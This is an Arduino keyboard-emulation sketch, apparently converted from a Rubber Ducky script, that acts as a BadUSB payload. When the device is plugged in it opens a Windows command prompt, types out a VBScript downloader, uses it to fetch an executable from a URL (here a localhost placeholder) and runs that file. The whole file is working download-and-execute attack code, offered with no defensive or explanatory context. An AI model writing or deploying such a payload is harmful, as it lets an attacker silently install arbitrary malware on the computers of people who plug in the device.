
/* Converted by LeonarDucky v1.0 */

#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(3000);
delay(200);
Keyboard.press(KEY_ESC);
Keyboard.releaseAll(); 
delay(200);
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_ESC);
Keyboard.releaseAll();
delay(400);
Keyboard.print("cmd");
delay(400);
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(400);
Keyboard.print("copy con download.vbs");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("If objXMLHTTP.Status = 200 Then");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(200);
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press('z');
Keyboard.releaseAll();
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("cscript download.vbs http://localhost/1.exe");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("1.exe");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("exit");
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
}
void loop() {}